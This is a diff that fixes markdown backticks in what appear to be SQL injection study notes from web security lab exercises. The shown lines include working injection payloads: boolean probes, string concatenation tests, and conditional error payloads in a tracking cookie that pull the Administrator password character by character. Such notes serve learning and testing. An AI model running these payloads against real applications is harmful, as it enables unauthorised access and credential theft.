@@ -32,7 +32,7 @@ To detect if SQL injection is possible:
 	- `'AND 1=1--`
 	- `'AND 1=2--`
 	- `'AND '1'='1`
-	- `'AND '1'='2
+	- `'AND '1'='2`
 - submit syntax that evaluates to the base (original) value, and to a different value, and look for systematic differences in the application responses. Do this via string concatenation:
 	- Original: `?category=Gifts`
 	- Resolving to original value: `?category=Gift'||'s
@@ -137,7 +137,7 @@ Blind SQL injection with OAST data exfiltration
 
 Triggering conditional errors
 - modify tracking cookie
-	- `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a -> no error
+	- `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` -> no error
 	- `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` -> error
 - retrieve data one character at the time (error when condition true)
 	- `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
